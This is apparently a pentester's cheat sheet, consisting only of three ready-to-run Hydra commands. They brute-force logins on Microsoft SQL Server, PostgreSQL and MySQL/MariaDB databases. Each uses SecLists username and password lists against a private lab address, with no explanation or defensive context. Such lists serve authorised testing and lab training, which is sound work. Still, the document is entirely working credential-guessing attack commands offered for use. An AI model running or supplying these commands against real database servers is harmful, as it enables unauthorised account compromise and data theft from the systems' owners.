## Hydra on Microsoft SQL Server Database
hydra -L /root/Bureau/SecLists/Usernames/top-usernames-shortlist.txt -P /root/Bureau/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 192.168.56.110 -e sn -f mssql

## Hydra on Postgres SQL Server Database
hydra -L /root/Bureau/SecLists/Usernames/top-usernames-shortlist.txt -P /root/Bureau/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 192.168.56.110 -e sn -f postgres

## Hydra on MySQL/MariaDB Database
hydra -L /root/Bureau/SecLists/Usernames/top-usernames-shortlist.txt -P /root/Bureau/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 192.168.56.110 -e sn -f mysql